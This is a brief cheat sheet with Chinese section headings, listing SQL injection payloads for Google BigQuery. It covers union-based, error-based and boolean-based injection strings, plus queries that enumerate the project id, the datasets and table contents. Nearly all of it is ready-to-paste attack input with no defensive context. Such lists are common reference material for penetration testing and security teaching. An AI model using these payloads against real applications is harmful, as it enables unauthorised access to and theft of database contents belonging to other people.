## 联合注入

```sql
UNION ALL SELECT (SELECT @@project_id),1,1,1,1,1,1)) AS T1 GROUP BY column_name#
true) GROUP BY column_name LIMIT 1 UNION ALL SELECT (SELECT 'asd'),1,1,1,1,1,1)) AS T1 GROUP BY column_name#
true) GROUP BY column_name LIMIT 1 UNION ALL SELECT (SELECT @@project_id),1,1,1,1,1,1)) AS T1 GROUP BY column_name#
' GROUP BY column_name UNION ALL SELECT column_name,1,1 FROM  (select column_name AS new_name from `project_id.dataset_name.table_name`) AS A GROUP BY column_name#
```

## 报错注入

```sql
# Error based - division by zero
' OR if(1/(length((select('a')))-1)=1,true,false) OR '

# Error based - casting: select CAST(@@project_id AS INT64)
dataset_name.column_name` union all select CAST(@@project_id AS INT64) ORDER BY 1 DESC#
```

## 布尔类型

```sql
' WHERE SUBSTRING((select column_name from `project_id.dataset_name.table_name` limit 1),1,1)='A'#
```

## 查询语句

```sql
# Gathering project id
select @@project_id

# Gathering all dataset names
select schema_name from INFORMATION_SCHEMA.SCHEMATA

# Gathering data from specific project id & dataset
select * from `project_id.dataset_name.table_name`
```

注释
```sql
select 1#from here it is not working
select 1/*between those it is not working*/
```
